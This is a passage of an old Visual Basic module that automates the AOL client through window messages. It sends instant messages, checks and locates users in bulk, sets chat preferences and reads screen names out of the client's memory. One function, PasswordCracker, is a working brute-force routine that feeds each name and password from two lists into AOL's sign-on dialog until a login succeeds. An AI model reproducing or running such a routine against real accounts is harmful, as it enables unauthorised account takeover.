AIMGetInfo$ = ReplaceCharacters(AIMGetInfo$, "</B>", "")
AIMGetInfo$ = ReplaceCharacters(AIMGetInfo$, "<BODY BGCOLOR=", "")
AIMGetInfo$ = ReplaceCharacters(AIMGetInfo$, "<FONT FACE=", "")
AIMGetInfo$ = ReplaceCharacters(AIMGetInfo$, "<S>", "")
AIMGetInfo$ = ReplaceCharacters(AIMGetInfo$, "</S>", "")
AIMGetInfo$ = ReplaceCharacters(AIMGetInfo$, "<I>", "")
AIMGetInfo$ = ReplaceCharacters(AIMGetInfo$, "</I>", "")
AIMGetInfo$ = ReplaceCharacters(AIMGetInfo$, "<U>", "")
AIMGetInfo$ = ReplaceCharacters(AIMGetInfo$, "</U>", "")
AIMGetInfo$ = Replacer(AIMGetInfo$, ">", "")
AIMGetInfo$ = Replacer(AIMGetInfo$, "#", "")
AIMGetInfo$ = Mid(AIMGetInfo$, 9)
KillWin parhand1&
End Function
Sub IMBuddy(Recipiant, message)
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
buddy% = FindChildByTitle(MDI%, "Buddy List Window")
If buddy% = 0 Then
    PoPup 9, "V"
    Do: DoEvents
    Loop Until buddy% <> 0
End If
AOIcon% = FindChildByClass(buddy%, "_AOL_Icon")
For l = 1 To 2
AOIcon% = GetWindow(AOIcon%, 2)
Next l
Call timeout(0.01)
ClickIcon (AOIcon%)
Do: DoEvents
IMWin% = FindChildByTitle(MDI%, "Send Instant Message")
AOEdit% = FindChildByClass(IMWin%, "_AOL_Edit")
AORich% = FindChildByClass(IMWin%, "RICHCNTL")
AOIcon% = FindChildByClass(IMWin%, "_AOL_Icon")
Loop Until AOEdit% <> 0 And AORich% <> 0 And AOIcon% <> 0
Call SendMessageByString(AOEdit%, WM_SETTEXT, 0, Recipiant)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, message)
For X = 1 To 9
    AOIcon% = GetWindow(AOIcon%, 2)
Next X
Call timeout(0.01)
ClickIcon (AOIcon%)
Do: DoEvents
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
IMWin% = FindChildByTitle(MDI%, "Send Instant Message")
OkWin% = FindWindow("#32770", "America Online")
If OkWin% <> 0 Then Call SendMessage(OkWin%, WM_CLOSE, 0, 0): closer2 = SendMessage(IMWin%, WM_CLOSE, 0, 0): Exit Do
If IMWin% = 0 Then Exit Do
Loop
End Sub
Function WaitForModal()
Do: DoEvents
modal% = FindWindow("_AOL_Modal", vbNullString)
stat% = FindChildByClass(modal%, "_AOL_Static")
edi% = FindChildByClass(modal%, "_AOL_Edit")
If modal% <> 0 And stat% <> 0 And edi% <> 0 Then Exit Do
Loop
End Function
Function PasswordCracker(NameList As ListBox, PWList As ListBox)
Dim Times As Integer
For name = 0 To NameList.ListCount 'Take next name in list
For PASS = 0 To PWList.ListCount Step 2 'Take next Password from list
    If AOL40_IsOnline = True Then
        Exit Function
    End If
Do: DoEvents 'start wait for sign on/goodbye screen
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
tit1% = FindChildByTitle(MDI%, "Sign On")
tit2% = FindChildByTitle(MDI%, "Goodbye from America Online!")
    If tit1% <> 0 Then
        tit% = tit1%
    ElseIf tit2% <> 0 Then
        tit% = tit2%
    End If
Combo% = FindChildByClass(tit%, "_AOL_Combobox")
edi% = FindChildByClass(tit%, "_AOL_Edit")
icona% = FindChildByClass(tit%, "_AOL_Icon")
If Combo% <> 0 And icona% <> 0 Then Exit Do
Loop
X = SendMessage(Combo%, WM_LBUTTONDOWN, 0, 0&)
X = SendMessage(Combo%, WM_LBUTTONUP, 0, 0&)
X = SendMessage(Combo%, WM_LBUTTONDOWN, 0, 0&)
X = SendMessage(Combo%, WM_LBUTTONUP, 0, 0&)
    If edi% <> 0 Then
For I = 1 To 6
X = SendMessageByNum(Combo%, WM_KEYDOWN, VK_RIGHT, 0)
X = SendMessageByNum(Combo%, WM_KEYUP, VK_RIGHT, 0)
Pause (0.2)
Next I
    End If
   icona% = GetWindow(icona%, GW_HWNDNEXT)
        icona% = GetWindow(icona%, GW_HWNDNEXT)
            signon = SendMessage(icona%, WM_LBUTTONDOWN, 0, 0&)
            signon = SendMessage(icona%, WM_LBUTTONUP, 0, 0&)
Call WaitForModal
Pause (0.2)
modal% = FindWindow("_AOL_Modal", vbNullString)
stat% = FindChildByClass(modal%, "_AOL_Static")
iconb% = FindChildByClass(modal%, "_AOL_Icon")
edi% = FindChildByClass(modal%, "_AOL_Edit")
    edi2% = GetWindow(edi%, GW_HWNDNEXT)
        edi3% = GetWindow(edi2%, GW_HWNDNEXT)
MainName$ = NameList.List(name)
CurrPassword$ = PWList.List(PASS)
fillit = SendMessageByString(edi%, WM_SETTEXT, 0, MainName$) 'Write current name
fillit = SendMessageByString(edi3%, WM_SETTEXT, 0, CurrPassword$) 'Write next password
Clickit = SendMessage(iconb%, WM_LBUTTONDOWN, 0, 0&)
Clickit = SendMessage(iconb%, WM_LBUTTONUP, 0, 0&)
Pause (0.5)
an% = FindWindow("#32770", vbNullString)
If an% <> 0 Then
X = SendMessage(an%, WM_CLOSE, 0, 0&)
CurrPassword$ = PWList.List(PASS + 1)
Pause (0.3)
fillit = SendMessageByString(edi%, WM_SETTEXT, 0, MainName$) 'Write current name
fillit = SendMessageByString(edi3%, WM_SETTEXT, 0, CurrPassword$) 'Write next password
Clickit = SendMessage(iconb%, WM_LBUTTONDOWN, 0, 0&)
Clickit = SendMessage(iconb%, WM_LBUTTONUP, 0, 0&)
If an% <> 0 Then
X = SendMessage(an%, WM_CLOSE, 0, 0&)
End If
End If
Pause (1)
Next PASS 'Take next password, hold same name
Next name 'Password list done, take next name
End Function
Function LoadTimes(FileName)
        free = FreeFile
    Open FileName For Random As free
    Close free 'this is to create the file if its not
    Open FileName For Input As free
I = FileLen(FileName)
X = Input(I, free)
    Close free
Open FileName For Output As #1
X = val(X) + 1
    Print #1, X
    Close #1
        LoadTimes = X
End Function
Function MacroDarken(Macro)
    For I = 1 To Len(Macro)
X$ = Mid(Macro, I, 1)
    If X$ = ":" Then Let X$ = ";"
Final$ = Final$ & X$
    Next I
        MacroDarken = Final$
End Function
Function MacroLighten(Macro)
    For I = 1 To Len(Macro)
X$ = Mid(Macro, I, 1)
    If X$ = ";" Then Let X$ = ":"
Final$ = Final$ & X$
    Next I
        MacroLighten = Final$
End Function
Function IsPrivate() As Boolean
IsPrivate = False
If FindRoom = 0 Then Exit Function
pict = FindChildByClass(FindRoom, "_AOL_Image")
pict = IsWindowVisible(pict)
If pict = False Then IsPrivate = True
End Function
Function BasToBox(box_to_load As ListBox, lbl As Label) As String
'what this function does:
'   first it finds a bas file by testing it with the 2 comboboxes
'       above
'   second, it loads box_to_load with all of the subs and functions
'       in that combobox, except for the (Declerations) listing
'   third, it returns the name of the bas file
'this is non-aol related ;) -sopon
box_to_load.Clear
rerun:
Dim vis As Integer, cnt As Integer, ing As Integer, msg As String, pnt As POINTAPI
Dim cap As String, pos As Integer, vbp As Integer, vbi As Integer, vbw As Integer
Dim cmb As Integer, Txt As String, inpt As String
vbp% = FindWindow("wndclass_desked_gsk", vbNullString)
vbi% = FindChildByClass(vbp, "MDIClient")
vbw% = FindChildByClass(vbi, "VbaWindow")
If vbw = 0 Then Exit Function
Call Restore(vbw)
cmb% = FindChildByClass(vbw, "Combobox")
If cmb = 0 Then
    KillWin vbw
    GoTo rerun
End If
Call GetCursorPos(pnt)
SetCursorPos 0, 0
Call PostMessage(cmb, WM_LBUTTONDBLCLK, 0, 0)
Do
    DoEvents
    vis = FindWindow("Combolbox", vbNullString)
Loop Until vis <> 0
If CountLB(vis) > 1 Then
    KillWin vbw
    GoTo rerun
End If
cmb = NextOfClass(cmb)
If cmb = 0 Then GoTo rerun
cap = GetWinText(vbw)
cap = Left(cap, Len(cap) - Len("(code )"))
pos = InStr(1, cap, "-")
cap = Right(cap, Len(cap) - pos)
cap = LTrim(cap)
cap = RTrim(cap)
cap = cap & ".bas"
lbl.Caption = cap
Call PostMessage(cmb, WM_LBUTTONDBLCLK, 0, 0)
Pause 1
Do
    DoEvents
    vis = FindWindow("Combolbox", vbNullString)
    ing = IsWindowVisible(vis)
Loop Until ing <> 0
Do
    cnt = CountLB(vis)
    Pause 1
    ing = CountLB(vis)
Loop Until cnt = ing
cnt = CountLB(vis)
BasToBox = cap
For ing = 1 To cnt - 1
    DoEvents
    box_to_load.AddItem GetLBText(ing, vis)
    Next ing
Call SendMessage(vis, CB_SHOWDROPDOWN, 0, 0)
SetCursorPos pnt.X, pnt.Y
End Function
Function CountLB(LB_hWnd)
Dim cnt
    cnt = SendMessage(LB_hWnd, LB_GETCOUNT, 0, 0)
CountLB = cnt
End Function
Function CountCB(CB_hWnd)
Dim cnt
    cnt = SendMessage(CB_hWnd, CB_GETCOUNT, 0, 0)
CountCB = cnt
End Function
Sub Restore(hwnd)
ShowWindow hwnd, SW_RESTORE
End Sub
Function NextOfClass(hwnd)
hlcas = GetClass(hwnd)
parnt = GetParent(hwnd)
NextOfClass = FindWindowEx(parnt, hwnd, hlcas, vbNullString)
End Function
Public Function CheckIMs2(Person As String) As String
    Dim AOL As Long, MDI As Long, im As Long, Rich As Long
    Dim Available As Long, Available1 As Long, Available2 As Long
    Dim Available3 As Long, oWindow As Long, oButton As Long
    Dim oStatic As Long, oString As String
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    Call KeyWord("aol://9293:" & Person$)
    Do
        DoEvents
        im& = FindWindowEx(MDI&, 0&, "AOL Child", "Send Instant Message")
        Rich& = FindWindowEx(im&, 0&, "RICHCNTL", vbNullString)
        Available1& = FindWindowEx(im&, 0&, "_AOL_Icon", vbNullString)
        Available2& = FindWindowEx(im&, Available1&, "_AOL_Icon", vbNullString)
        Available3& = FindWindowEx(im&, Available2&, "_AOL_Icon", vbNullString)
        Available& = FindWindowEx(im&, Available3&, "_AOL_Icon", vbNullString)
        Available& = FindWindowEx(im&, Available&, "_AOL_Icon", vbNullString)
        Available& = FindWindowEx(im&, Available&, "_AOL_Icon", vbNullString)
        Available& = FindWindowEx(im&, Available&, "_AOL_Icon", vbNullString)
        Available& = FindWindowEx(im&, Available&, "_AOL_Icon", vbNullString)
        Available& = FindWindowEx(im&, Available&, "_AOL_Icon", vbNullString)
        Available& = FindWindowEx(im&, Available&, "_AOL_Icon", vbNullString)
    Loop Until im& <> 0& And Rich <> 0& And Available& <> 0& And Available& <> Available1& And Available& <> Available2& And Available& <> Available3&
    DoEvents
    Call SendMessage(Available&, WM_LBUTTONDOWN, 0&, 0&)
    Call SendMessage(Available&, WM_LBUTTONUP, 0&, 0&)
    Do
        DoEvents
        oWindow& = FindWindow("#32770", "America Online")
        oButton& = FindWindowEx(oWindow&, 0&, "Button", "OK")
    Loop Until oWindow& <> 0& And oButton& <> 0&
    Do
        DoEvents
        oStatic& = FindWindowEx(oWindow&, 0&, "Static", vbNullString)
        oStatic& = FindWindowEx(oWindow&, oStatic&, "Static", vbNullString)
        oString$ = GetText(oStatic)
    Loop Until oStatic& <> 0& And Len(oString$) > 15
    CheckIMs2 = GetMsgText(oWindow&)
    Call SendMessage(oButton&, WM_KEYDOWN, VK_SPACE, 0&)
    Call SendMessage(oButton&, WM_KEYUP, VK_SPACE, 0&)
    Call PostMessage(im&, WM_CLOSE, 0&, 0&)
    End Function
Public Sub MassLocator(con As Control)
Dim I, X, beer, weed
I = con.ListCount - 1
con.ListIndex = 0
For X = 0 To I
con.ListIndex = X
weed = Lst.Text
con.RemoveItem con.ListIndex
con.AddItem LocateMember(weed, True), 0
Next X
End Sub
Public Sub MassIMChecker(con As Control)
Dim I, X, beer, weed$
I = con.ListCount - 1
con.ListIndex = 0
For X = 0 To I
con.ListIndex = X
weed$ = Lst.Text
con.RemoveItem con.ListIndex
con.AddItem CheckIMs2(weed$), 0
Next X
End Sub
Function ScrollProfile(Person As String)
If Len(Person) > 10 Then Exit Function
If Len(Person) < 3 Then Exit Function
Scroll2 ProfileGet(Person)
End Function
Sub RemoveBlankItems(numb As ListBox)
Do
NoFreeze% = DoEvents()
If LCase$(numb.List(A)) = LCase$("") Then numb.RemoveItem (A)
A = 1 + A
Loop Until A >= numb.ListCount
End Sub
Sub ClickStopLoad()
parhand1& = FindWindow("AOL Frame25", "America  Online")
parhand2& = FindWindowEx(parhand1&, 0, "AOL Toolbar", vbNullString)
ourparent& = FindWindowEx(parhand2&, 0, "_AOL_Toolbar", vbNullString)
Hand1& = FindWindowEx(ourparent&, 0, "_AOL_Icon", vbNullString)
Hand2& = FindWindowEx(ourparent&, Hand1&, "_AOL_Icon", vbNullString)
Hand3& = FindWindowEx(ourparent&, Hand2&, "_AOL_Icon", vbNullString)
hand4& = FindWindowEx(ourparent&, Hand3&, "_AOL_Icon", vbNullString)
hand5& = FindWindowEx(ourparent&, hand4&, "_AOL_Icon", vbNullString)
hand6& = FindWindowEx(ourparent&, hand5&, "_AOL_Icon", vbNullString)
hand7& = FindWindowEx(ourparent&, hand6&, "_AOL_Icon", vbNullString)
hand8& = FindWindowEx(ourparent&, hand7&, "_AOL_Icon", vbNullString)
Hand9& = FindWindowEx(ourparent&, hand8&, "_AOL_Icon", vbNullString)
Hand10& = FindWindowEx(ourparent&, Hand9&, "_AOL_Icon", vbNullString)
Hand11& = FindWindowEx(ourparent&, Hand10&, "_AOL_Icon", vbNullString)
Hand12& = FindWindowEx(ourparent&, Hand11&, "_AOL_Icon", vbNullString)
Hand13& = FindWindowEx(ourparent&, Hand12&, "_AOL_Icon", vbNullString)
Hand14& = FindWindowEx(ourparent&, Hand13&, "_AOL_Icon", vbNullString)
Hand15& = FindWindowEx(ourparent&, Hand14&, "_AOL_Icon", vbNullString)
Hand16& = FindWindowEx(ourparent&, Hand15&, "_AOL_Icon", vbNullString)
OurHandle% = FindWindowEx(ourparent&, Hand16&, "_AOL_Icon", vbNullString)
ClickIcon OurHandle%, False
End Sub
Sub ClickGo()
parhand1& = FindWindow("AOL Frame25", "America  Online")
parhand2& = FindWindowEx(parhand1&, 0, "AOL Toolbar", vbNullString)
ourparent& = FindWindowEx(parhand2&, 0, "_AOL_Toolbar", vbNullString)
Hand1& = FindWindowEx(ourparent&, 0, "_AOL_Icon", vbNullString)
Hand2& = FindWindowEx(ourparent&, Hand1&, "_AOL_Icon", vbNullString)
Hand3& = FindWindowEx(ourparent&, Hand2&, "_AOL_Icon", vbNullString)
hand4& = FindWindowEx(ourparent&, Hand3&, "_AOL_Icon", vbNullString)
hand5& = FindWindowEx(ourparent&, hand4&, "_AOL_Icon", vbNullString)
hand6& = FindWindowEx(ourparent&, hand5&, "_AOL_Icon", vbNullString)
hand7& = FindWindowEx(ourparent&, hand6&, "_AOL_Icon", vbNullString)
hand8& = FindWindowEx(ourparent&, hand7&, "_AOL_Icon", vbNullString)
Hand9& = FindWindowEx(ourparent&, hand8&, "_AOL_Icon", vbNullString)
Hand10& = FindWindowEx(ourparent&, Hand9&, "_AOL_Icon", vbNullString)
Hand11& = FindWindowEx(ourparent&, Hand10&, "_AOL_Icon", vbNullString)
Hand12& = FindWindowEx(ourparent&, Hand11&, "_AOL_Icon", vbNullString)
Hand13& = FindWindowEx(ourparent&, Hand12&, "_AOL_Icon", vbNullString)
Hand14& = FindWindowEx(ourparent&, Hand13&, "_AOL_Icon", vbNullString)
Hand15& = FindWindowEx(ourparent&, Hand14&, "_AOL_Icon", vbNullString)
Hand16& = FindWindowEx(ourparent&, Hand15&, "_AOL_Icon", vbNullString)
Hand17& = FindWindowEx(ourparent&, Hand16&, "_AOL_Icon", vbNullString)
Hand18& = FindWindowEx(ourparent&, Hand17&, "_AOL_Icon", vbNullString)
Hand19& = FindWindowEx(ourparent&, Hand18&, "_AOL_Icon", vbNullString)
Hand20& = FindWindowEx(ourparent&, Hand19&, "_AOL_Icon", vbNullString)
OurHandle% = FindWindowEx(ourparent&, Hand20&, "_AOL_Icon", vbNullString)
ClickIcon OurHandle%, False
End Sub
Function MakeAolChild(numb As Form)
SetParent numb.hwnd, AOLMDI
End Function
Sub ShowNotifyAolInPR()
Dim ourparent As Long, Hand1&, Hand2&, Hand3&, hand4&, hand5&, hand6&, hand7&, hand8&, OurHandle&
ourparent& = FindChildByTitle(AOLMDI, GetRoomName)
Hand1& = FindWindowEx(ourparent&, 0, "_AOL_Icon", vbNullString)
Hand2& = FindWindowEx(ourparent&, Hand1&, "_AOL_Icon", vbNullString)
Hand3& = FindWindowEx(ourparent&, Hand2&, "_AOL_Icon", vbNullString)
hand4& = FindWindowEx(ourparent&, Hand3&, "_AOL_Icon", vbNullString)
hand5& = FindWindowEx(ourparent&, hand4&, "_AOL_Icon", vbNullString)
hand6& = FindWindowEx(ourparent&, hand5&, "_AOL_Icon", vbNullString)
hand7& = FindWindowEx(ourparent&, hand6&, "_AOL_Icon", vbNullString)
hand8& = FindWindowEx(ourparent&, hand7&, "_AOL_Icon", vbNullString)
OurHandle& = FindWindowEx(ourparent&, hand8&, "_AOL_Icon", vbNullString)
Call ShowWindow(OurHandle&, SW_SHOW)
Call Enable(OurHandle&)
End Sub
Sub ShowImageInPR()
Dim ourparent As Long, OurHandle As Long
ourparent& = FindChildByTitle(AOLMDI, GetRoomName)
OurHandle& = FindWindowEx(ourparent&, 0, "_AOL_Image", vbNullString)
Call ShowWindow(OurHandle&, SW_SHOW): Call Enable(OurHandle&)
End Sub
Sub ShowNotifyAolInAIMIm()
ourparent& = FindChildByTitle(AOLMDI, "  Instant Message From: *")
If ourparent& = 0& Then
ourparent& = FindChildByTitle(AOLMDI, ">Instant Message From: *")
End If
Hand1& = FindWindowEx(ourparent&, 0, "_AOL_Icon", vbNullString)
Hand2& = FindWindowEx(ourparent&, Hand1&, "_AOL_Icon", vbNullString)
Hand3& = FindWindowEx(ourparent&, Hand2&, "_AOL_Icon", vbNullString)
hand4& = FindWindowEx(ourparent&, Hand3&, "_AOL_Icon", vbNullString)
hand5& = FindWindowEx(ourparent&, hand4&, "_AOL_Icon", vbNullString)
hand6& = FindWindowEx(ourparent&, hand5&, "_AOL_Icon", vbNullString)
hand7& = FindWindowEx(ourparent&, hand6&, "_AOL_Icon", vbNullString)
hand8& = FindWindowEx(ourparent&, hand7&, "_AOL_Icon", vbNullString)
Hand9& = FindWindowEx(ourparent&, hand8&, "_AOL_Icon", vbNullString)
Hand10& = FindWindowEx(ourparent&, Hand9&, "_AOL_Icon", vbNullString)
Hand11& = FindWindowEx(ourparent&, Hand10&, "_AOL_Icon", vbNullString)
OurHandle& = FindWindowEx(ourparent&, Hand11&, "_AOL_Icon", vbNullString)
Call ShowWindow(OurHandle&, SW_SHOW): Call Enable(OurHandle&)
End Sub
Sub ghghgh(frm As CommandButton, OurHandle As Long)
bbb = SetParent(frm.hwnd, OurHandle&)
Dim abc As Variant
Dim xyz As Variant
abc = 0
xyz = 0
frm.Move abc, xyz
End Sub
Function SetChatPreferences(arrive As Boolean, leave As Boolean, doublespace As Boolean, alphabatize As Boolean, sounds As Boolean)
Dim Hand1 As Long, Hand2 As Long, Hand3 As Long
Dim hand4 As Long, hand5 As Long, hand6 As Long
Dim hand7 As Long, hand8 As Long, Hand9 As Long
Dim Hand10 As Long, Hand11 As Long, Hand12 As Long
Dim Hand13 As Long, Hand14 As Long, OurParent1 As Long
Dim OurHandle1 As Long, OurHandle2 As Long, OurHandle3 As Long
Do: DoEvents
Hand1& = FindWindowEx(GetRoom&, 0, "_AOL_Icon", vbNullString)
Hand2& = FindWindowEx(GetRoom&, Hand1&, "_AOL_Icon", vbNullString)
Hand3& = FindWindowEx(GetRoom&, Hand2&, "_AOL_Icon", vbNullString)
hand4& = FindWindowEx(GetRoom&, Hand3&, "_AOL_Icon", vbNullString)
hand5& = FindWindowEx(GetRoom&, hand4&, "_AOL_Icon", vbNullString)
hand6& = FindWindowEx(GetRoom&, hand5&, "_AOL_Icon", vbNullString)
hand7& = FindWindowEx(GetRoom&, hand6&, "_AOL_Icon", vbNullString)
hand8& = FindWindowEx(GetRoom&, hand7&, "_AOL_Icon", vbNullString)
Hand9& = FindWindowEx(GetRoom&, hand8&, "_AOL_Icon", vbNullString)
Hand10& = FindWindowEx(GetRoom&, Hand9&, "_AOL_Icon", vbNullString)
Loop Until Hand10& <> 0&
Call SendMessage(Hand10&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessage(Hand10&, WM_LBUTTONUP, 0&, 0&)
Do: DoEvents
OurParent1& = FindWindow("_AOL_Modal", vbNullString)
Hand11& = FindWindowEx(OurParent1&, 0, "_AOL_Checkbox", vbNullString)
Hand12& = FindWindowEx(OurParent1&, Hand11&, "_AOL_Checkbox", vbNullString)
Hand13& = FindWindowEx(OurParent1&, Hand12&, "_AOL_Checkbox", vbNullString)
Hand14& = FindWindowEx(OurParent1&, Hand13&, "_AOL_Checkbox", vbNullString)
OurHandle1& = FindWindowEx(OurParent1&, Hand14&, "_AOL_Checkbox", vbNullString)
Loop Until OurParent1& <> 0& And Hand11& <> 0& And Hand12& <> 0& And Hand13& <> 0& And Hand14& <> 0& And OurHandle1& <> 0&
Call SendMessageByNum(Hand11&, BM_SETCHECK, arrive, 0&)
Call SendMessageByNum(Hand12&, BM_SETCHECK, leave, 0&)
Call SendMessageByNum(Hand13&, BM_SETCHECK, doublespace, 0&)
Call SendMessageByNum(Hand14&, BM_SETCHECK, alphabatize, 0&)
Call SendMessageByNum(OurHandle1&, BM_SETCHECK, sounds, 0&)
Do: DoEvents
OurHandle2& = FindWindowEx(OurParent1&, 0, "_AOL_Icon", vbNullString)
Loop Until OurHandle2& <> 0&
Call SendMessage(OurHandle2&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessage(OurHandle2&, WM_LBUTTONUP, 0&, 0&)
Do: DoEvents
OurHandle3& = FindWindow("#32770", "America Online")
Loop Until OurHandle3& <> 0
If OurHandle3& <> 0 Then
OurHandle3& = FindWindowEx(OurHandle3&, 0&, "Button", vbNullString)
Call SendMessage(OurHandle3&, WM_KEYDOWN, VK_SPACE, 0&)
Call SendMessage(OurHandle3&, WM_KEYUP, VK_SPACE, 0&)
End If
End Function

Function SwitchNamesToList(numb As ListBox, AddUser As Boolean)
If Online = False Then Exit Function
On Error Resume Next
Dim rum As Long, Sex As Long, vodka As String
Dim oral As Long, lewinsky As Long, index As Long, beer As Long
Dim jack As Long, brandy As Long, rocks As Long
beer& = FindChildByTitle(AOLMDI(), "Switch Screen Names")
If beer& = 0& Then
RunMenuByString3 ("Switch Scree&n Names")
End If: Do: DoEvents
beer& = FindChildByTitle(AOLMDI(), "Switch Screen Names")
Loop Until beer& <> 0: Pause 1
jack& = FindWindowEx(beer&, 0&, "_AOL_Listbox", vbNullString)
brandy& = GetWindowThreadProcessId(jack&, rum&)
rocks& = OpenProcess(PROCESS_READ Or RIGHTS_REQUIRED, False, rum&)
If rocks& Then
For index& = 0 To SendMessage(jack&, LB_GETCOUNT, 0, 0) - 1
vodka$ = String$(4, vbNullChar)
Sex& = SendMessage(jack&, LB_GETITEMDATA, ByVal CLng(index&), ByVal 0&)
Sex& = Sex& + 24
Call ReadProcessMemory(rocks&, Sex&, vodka$, 4, lewinsky&)
Call CopyMemory(oral&, ByVal vodka$, 4)
oral& = oral& + 6: vodka$ = String$(16, vbNullChar)
Call ReadProcessMemory(rocks&, oral&, vodka$, Len(vodka$), lewinsky&)
vodka$ = Left$(vodka$, InStr(vodka$, vbNullChar) - 1)
If vodka$ <> User$ Or AddUser = True Then
numb.AddItem Mid(vodka$, 2): End If
Next index&
Call CloseHandle(rocks&): End If
End Function

Public Sub ChatIgnore(name As String)
    On Error Resume Next
    Dim cProcess As Long, itmHold As Long, ScreenName As String
    Dim psnHold As Long, rBytes As Long, index As Long, Room As Long
    Dim rList As Long, sThread As Long, mThread As Long
    Dim lIndex As Long
    Room& = FindRoom&
    If Room& = 0& Then Exit Sub
    rList& = FindWindowEx(Room&, 0&, "_AOL_Listbox", vbNullString)
    sThread& = GetWindowThreadProcessId(rList, cProcess&)
    mThread& = OpenProcess(PROCESS_READ Or RIGHTS_REQUIRED, False, cProcess&)
    If mThread& Then
        For index& = 0 To SendMessage(rList, LB_GETCOUNT, 0, 0) - 1
            ScreenName$ = String$(4, vbNullChar)
            itmHold& = SendMessage(rList, LB_GETITEMDATA, ByVal CLng(index&), ByVal 0&)
            itmHold& = itmHold& + 24
            Call ReadProcessMemory(mThread&, itmHold&, ScreenName$, 4, rBytes)
            Call CopyMemory(psnHold&, ByVal ScreenName$, 4)
            psnHold& = psnHold& + 6
            ScreenName$ = String$(16, vbNullChar)
            Call ReadProcessMemory(mThread&, psnHold&, ScreenName$, Len(ScreenName$), rBytes&)
            ScreenName$ = Left$(ScreenName$, InStr(ScreenName$, vbNullChar) - 1)
            If ScreenName$ <> GetUser$ And LCase(ScreenName$) = LCase(name$) Then
                lIndex& = index&
                Call ChatIgnoreByIndex(lIndex&)
                DoEvents
                Exit Sub
            End If
        Next index&
        Call CloseHandle(mThread)
    End If
End Sub

Sub ClickIcon(icon, Optional Wait As Boolean = False)
      DoEvents
    down% = PostMessage(icon, WM_LBUTTONDOWN, 0, 0&)
    
If Wait = True Then Pause 0.5

    DoEvents
    up% = PostMessage(icon, WM_LBUTTONUP, 0, 0&)
End Sub

